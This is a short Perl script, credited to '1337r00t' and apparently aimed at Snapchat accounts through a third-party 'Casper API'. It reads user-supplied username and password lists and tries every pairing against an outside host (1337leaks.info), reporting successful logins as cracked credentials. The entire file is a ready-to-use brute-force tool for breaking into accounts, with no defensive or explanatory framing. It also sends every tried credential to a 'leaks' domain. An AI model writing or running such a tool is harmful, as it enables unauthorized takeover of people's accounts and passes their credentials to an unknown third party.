##########################################
use LWP::UserAgent; # ppm install LWP::UserAgent
##########################################
system('cls');
system('color 3');
print qq(
################################
#   [Casper API] BF SC API     #
################################
#     Coded By 1337r00t        #
################################
#                              #
#   Instagram : 1337r00t       #
#                              #
#    Twitter : _1337r00t       #
#                              #
################################
Enter [CTRL+C] For Exit :0\n);
print qq(
Enter Usernames File :
> );
$usernames=<STDIN>;
chomp($usernames);
open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
@USERS = <USERFILE>;
close USERFILE;

print qq(
Enter Passwords File :
> );
$passwords=<STDIN>;
chomp($passwords);
open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
@PASSS = <PASSFILE>;
close PASSFILE;
system('cls');
print "Cracking Now !..\n";
######################
foreach $username (@USERS) {
chomp $username;
	foreach $password (@PASSS) {
	chomp $password;
		$request = LWP::UserAgent->new();
		$response = $request->get("http://1337leaks.info/sc/api/?u=$username&p=$password");
		if($response->content =~ /Logged/){
			print "Logged->($username:$password)\n";
			sleep(3);
		}
		else
		{
			if($response->content =~ /Not Found/){
				print "Not Found -> ($username)\n";
			}
			else
			{
				if($response->content =~ /Failed/){
					print "Failed -> ($username:$password)\n";
				}
				else
				{
					if($response->content =~ /Blocked/){
						print "Blocked\n";
					}
					else
					{
						print "Error\n";
					}
				}
			}
		}
	}
}
